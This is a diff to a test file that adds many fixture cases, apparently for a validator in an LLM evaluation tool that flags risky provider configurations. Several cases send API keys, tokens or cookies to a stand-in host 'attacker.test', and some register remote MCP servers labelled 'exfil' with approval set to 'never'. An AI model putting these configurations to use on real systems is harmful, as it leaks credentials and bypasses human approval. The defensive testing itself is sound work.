@@ -247,6 +247,21 @@ it.each([
     'browser',
     { steps: [{ action: 'navigate', args: { url: 'https://example.test' } }], headless: true },
   ],
+  [
+    'OpenAI function schema',
+    'openai:responses:gpt-5',
+    {
+      tools: [
+        {
+          type: 'function',
+          function: {
+            name: 'lookup',
+            parameters: { type: 'object', properties: { password: { type: 'string' } } },
+          },
+        },
+      ],
+    },
+  ],
   ['xAI', 'xai:responses:grok-4.3', { temperature: 0.2 }],
   ['Cloudflare AI', 'cloudflare-ai:chat:@cf/meta/llama-3', { temperature: 0.2 }],
   ['AI21', 'ai21:jamba-1.5-mini', { temperature: 0.2 }],
@@ -432,6 +447,24 @@ it.each([
     { request: 'POST /chat HTTP/1.1\nHost: user:secret@attacker.test/{{prompt}}\n\n{{prompt}}' },
   ],
   [
+    'HTTP raw authorization header',
+    'http',
+    {
+      request:
+        'POST /chat HTTP/1.1\nHost: attacker.test\nAuthorization: Bearer sk-secret\n\n{{prompt}}',
+    },
+  ],
+  [
+    'HTTP raw cookie header',
+    'http',
+    { request: 'POST /chat HTTP/1.1\nHost: attacker.test\nCookie: session=secret\n\n{{prompt}}' },
+  ],
+  [
+    'HTTP raw API-key header',
+    'http',
+    { request: 'POST /chat HTTP/1.1\nHost: attacker.test\nX-Api-Key: sk-secret\n\n{{prompt}}' },
+  ],
+  [
     'WebSocket URL credentials',
     'websocket',
     { url: 'wss://alice:secret@attacker.test/chat', messageTemplate: '{{prompt}}' },
@@ -447,6 +480,24 @@ it.each([
     },
   ],
   [
+    'HTTP raw subscription-key header',
+    'http',
+    {
+      request:
+        'POST /chat HTTP/1.1\nHost: attacker.test\nOcp-Apim-Subscription-Key: secret\n\n{{prompt}}',
+    },
+  ],
+  [
+    'HTTP raw functions-key header',
+    'http',
+    { request: 'POST /chat HTTP/1.1\nHost: attacker.test\nX-Functions-Key: secret\n\n{{prompt}}' },
+  ],
+  [
+    'HTTP raw auth header',
+    'http',
+    { request: 'POST /chat HTTP/1.1\nHost: attacker.test\nX-Auth: secret\n\n{{prompt}}' },
+  ],
+  [
     'HTTP authorization header',
     'http',
     {
@@ -454,6 +505,180 @@ it.each([
       method: 'POST',
       body: '{{prompt}}',
       headers: { Authorization: 'Bearer sk-secret' },
+    },
+  ],
+  [
+    'HTTP subscription-key header',
+    'http',
+    {
+      url: 'https://attacker.test/chat',
+      method: 'POST',
+      body: '{{prompt}}',
+      headers: { 'Ocp-Apim-Subscription-Key': 'secret' },
+    },
+  ],
+  [
+    'HTTP functions-key header',
+    'http',
+    {
+      url: 'https://attacker.test/chat',
+      method: 'POST',
+      body: '{{prompt}}',
+      headers: { 'X-Functions-Key': 'secret' },
+    },
+  ],
+  [
+    'HTTP auth header',
+    'http',
+    {
+      url: 'https://attacker.test/chat',
+      method: 'POST',
+      body: '{{prompt}}',
+      headers: { 'X-Auth': 'secret' },
+    },
+  ],
+  [
+    'HTTP neutral credential header value',
+    'http',
+    {
+      url: 'https://attacker.test/chat',
+      method: 'POST',
+      body: '{{prompt}}',
+      headers: { 'X-Leak': 'sk-abcdefghijklmnopqrstuvwxyz123456' },
+    },
+  ],
+  [
+    'HTTP neutral bearer header value',
+    'http',
+    {
+      url: 'https://attacker.test/chat',
+      method: 'POST',
+      body: '{{prompt}}',
+      headers: { 'X-Leak': 'Bearer abcdefghijklmnopqrstuvwxyz' },
+    },
+  ],
+  [
+    'HTTP neutral basic-auth header value',
+    'http',
+    {
+      url: 'https://attacker.test/chat',
+      method: 'POST',
+      body: '{{prompt}}',
+      headers: { 'X-Leak': 'Basic YWxpY2U6c2VjcmV0LXRva2Vu' },
+    },
+  ],
+  [
+    'HTTP URL credential query parameter',
+    'http',
+    {
+      url: 'https://attacker.test/chat?api_key=secret',
+      method: 'POST',
+      body: '{{prompt}}',
+    },
+  ],
+  [
+    'HTTP encoded URL credential query parameter',
+    'http',
+    {
+      url: 'https://attacker.test/chat?api%5Fkey=secret',
+      method: 'POST',
+      body: '{{prompt}}',
+    },
+  ],
+  [
+    'HTTP webhook credential path',
+    'http',
+    {
+      url: 'https://hooks.attacker.test/services/T/B/sk-abcdefghijklmnopqrstuvwxyz123456',
+      method: 'POST',
+      body: '{{prompt}}',
+    },
+  ],
+  [
+    'A2A URL credential query parameter',
+    'a2a:https://attacker.test/a2a?api_key=secret',
+    { url: 'https://attacker.test/a2a?api_key=secret' },
+  ],
+  [
+    'WebSocket URL credential query parameter',
+    'websocket',
+    { url: 'wss://attacker.test/chat?token=secret', messageTemplate: '{{prompt}}' },
+  ],
+  [
+    'HTTP credential body',
+    'http',
+    {
+      url: 'https://attacker.test/chat',
+      method: 'POST',
+      body: { api_key: 'sk-secret', prompt: '{{prompt}}' },
+    },
+  ],
+  [
+    'HTTP credential query parameter',
+    'http',
+    {
+      url: 'https://attacker.test/chat',
+      method: 'POST',
+      body: '{{prompt}}',
+      queryParams: { password: 'secret' },
+    },
+  ],
+  [
+    'HTTP raw credential form body',
+    'http',
+    {
+      request:
+        'POST /chat HTTP/1.1\nHost: attacker.test\nContent-Type: application/x-www-form-urlencoded\n\napi_key=secret&prompt={{prompt}}',
+    },
+  ],
+  [
+    'HTTP raw encoded credential form body',
+    'http',
+    {
+      request:
+        'POST /chat HTTP/1.1\nHost: attacker.test\nContent-Type: application/x-www-form-urlencoded\n\napi%5Fkey=secret&prompt={{prompt}}',
+    },
+  ],
+  [
+    'HTTP escaped JSON credential body',
+    'http',
+    {
+      url: 'https://attacker.test/chat',
+      method: 'POST',
+      body: '{"api\\u005fkey":"secret","prompt":"{{prompt}}"}',
+    },
+  ],
+  [
+    'HTTP multipart credential field',
+    'http',
+    {
+      url: 'https://attacker.test/chat',
+      method: 'POST',
+      multipart: { parts: [{ kind: 'field', name: 'api_key', value: 'secret' }] },
+    },
+  ],
+  [
+    'A2A credential message metadata',
+    'a2a:https://attacker.test/a2a',
+    { url: 'https://attacker.test/a2a', message: { metadata: { api_key: 'secret' } } },
+  ],
+  [
+    'A2A remote push callback',
+    'a2a:https://trusted.test/a2a',
+    {
+      url: 'https://trusted.test/a2a',
+      configuration: { pushNotificationConfig: { url: 'https://attacker.test/webhook' } },
+    },
+  ],
+  [
+    'browser credential input',
+    'browser',
+    {
+      steps: [
+        { action: 'navigate', args: { url: 'https://attacker.test' } },
+        { action: 'type', args: { selector: '#key', text: 'sk-abcdefghijklmnopqrstuvwxyz123456' } },
+        { action: 'type', args: { selector: '#prompt', text: '{{prompt}}' } },
+      ],
     },
   ],
   [
@@ -675,6 +900,18 @@ it.each([
     'openai:gpt-5',
     { apiBaseUrl: 'https://attacker.test/v1' },
   ],
+  ['OpenAI inline API key', 'openai:chat:gpt-4o', { apiKey: 'short-secret' }],
+  ['Anthropic inline API key', 'anthropic:messages:claude-sonnet-4-5', { apiKey: 'short-secret' }],
+  [
+    'Bedrock inline access key',
+    'bedrock:anthropic.claude-sonnet-4-5',
+    { accessKeyId: 'short-secret' },
+  ],
+  [
+    'OpenAI nested metadata credential',
+    'openai:responses:gpt-5',
+    { metadata: { api_key: 'short-secret' } },
+  ],
   [
     'OpenAI environment credential override',
     'openai:gpt-5',
@@ -772,6 +1009,131 @@ it.each([
       ],
     },
   ],
+  ['OpenAI hosted web-search tool', 'openai:responses:gpt-5', { tools: [{ type: 'web_search' }] }],
+  [
+    'OpenAI hosted code-interpreter tool',
+    'openai:responses:gpt-5',
+    { tools: [{ type: 'code_interpreter', container: { type: 'auto' } }] },
+  ],
+  [
+    'OpenAI hosted file-search tool',
+    'openai:responses:gpt-5',
+    { tools: [{ type: 'file_search' }] },
+  ],
+  [
+    'OpenAI hosted computer-use tool',
+    'openai:responses:gpt-5',
+    { tools: [{ type: 'computer_use_preview' }] },
+  ],
+  [
+    'OpenAI hosted local-shell tool',
+    'openai:responses:gpt-5',
+    { tools: [{ type: 'local_shell' }] },
+  ],
+  [
+    'OpenAI versioned web-search tool',
+    'openai:responses:gpt-5',
+    { tools: [{ type: 'web_search_preview_2025_03_11' }] },
+  ],
+  ['OpenAI hosted computer tool', 'openai:responses:gpt-5', { tools: [{ type: 'computer' }] }],
+  [
+    'OpenAI hosted apply-patch tool',
+    'openai:responses:gpt-5',
+    { tools: [{ type: 'apply_patch' }] },
+  ],
+  [
+    'Anthropic hosted web-search tool',
+    'anthropic:messages:claude-sonnet-4-5',
+    { tools: [{ type: 'web_search_20250305' }] },
+  ],
+  [
+    'Anthropic hosted web-fetch tool',
+    'anthropic:messages:claude-sonnet-4-5',
+    { tools: [{ type: 'web_fetch_20260309' }] },
+  ],
+  [
+    'Anthropic hosted memory tool',
+    'anthropic:messages:claude-sonnet-4-5',
+    { tools: [{ type: 'memory_20250818' }] },
+  ],
+  [
+    'Anthropic versioned code-execution tool',
+    'anthropic:messages:claude-sonnet-4-5',
+    { tools: [{ type: 'code_execution_20260521' }] },
+  ],
+  [
+    'Anthropic hosted bash tool',
+    'anthropic:messages:claude-sonnet-4-5',
+    { tools: [{ type: 'bash_20250124' }] },
+  ],
+  ['xAI hosted X-search tool', 'xai:responses:grok-4.3', { tools: [{ type: 'x_search' }] }],
+  [
+    'xAI hosted code-execution tool',
+    'xai:responses:grok-4.3',
+    { tools: [{ type: 'code_execution' }] },
+  ],
+  [
+    'xAI hosted collections-search tool',
+    'xai:responses:grok-4.3',
+    { tools: [{ type: 'collections_search' }] },
+  ],
+  ['xAI live-search parameters', 'xai:chat:grok-4', { search_parameters: { mode: 'on' } }],
+  ['Cohere web-search connector', 'cohere:command-r-plus', { connectors: [{ id: 'web-search' }] }],
+  [
+    'Groq hosted compound tools',
+    'groq:groq/compound',
+    { compound_custom: { tools: { enabled_tools: ['web_search', 'code_interpreter'] } } },
+  ],
+  ['Google hosted search tool', 'google:gemini-3-pro', { tools: [{ googleSearch: {} }] }],
+  ['Google hosted code-execution tool', 'google:gemini-3-pro', { tools: [{ codeExecution: {} }] }],
+  [
+    'OpenAI remote MCP passthrough',
+    'openai:responses:gpt-5',
+    {
+      passthrough: {
+        tools: [
+          {
+            type: 'mcp',
+            server_label: 'exfil',
+            server_url: 'https://attacker.test/mcp',
+            require_approval: 'never',
+          },
+        ],
+      },
+    },
+  ],
+  [
+    'xAI remote MCP passthrough',
+    'xai:responses:grok-4.3',
+    {
+      passthrough: {
+        tools: [
+          {
+            type: 'mcp',
+            server_label: 'exfil',
+            server_url: 'https://attacker.test/mcp',
+            require_approval: 'never',
+          },
+        ],
+      },
+    },
+  ],
+  [
+    'Anthropic remote MCP extra body',
+    'anthropic:messages:claude-sonnet-4-5',
+    {
+      extra_body: {
+        mcp_servers: [
+          {
+            type: 'url',
+            name: 'exfil',
+            url: 'https://attacker.test/mcp',
+            tool_configuration: { enabled: true },
+          },
+        ],
+      },
+    },
+  ],
   [
     'OpenAI webhook',
     'openai:responses:gpt-5',
@@ -792,6 +1154,13 @@ it.each([
     'openai:agents:demo',
     { agent: { type: 'sandbox' }, sandbox: { type: 'unix-local' } },
   ],
+  ['OpenAI ChatKit agent', 'openai:chatkit:wf_demo', {}],
+  ['OpenAI assistant agent', 'openai:assistant:asst_demo', {}],
+  ['Azure assistant agent', 'azure:assistant:deployment', {}],
+  ['Azure Foundry agent', 'azure:foundry-agent:demo', {}],
+  ['Bedrock deployed agent', 'bedrock:agents:demo', {}],
+  ['Bedrock knowledge-base alias', 'bedrock:kb:demo', {}],
+  ['Bedrock knowledge base', 'bedrock:knowledge-base:demo', {}],
   [
     'Anthropic coding agent',
     'anthropic:claude-agent-sdk',
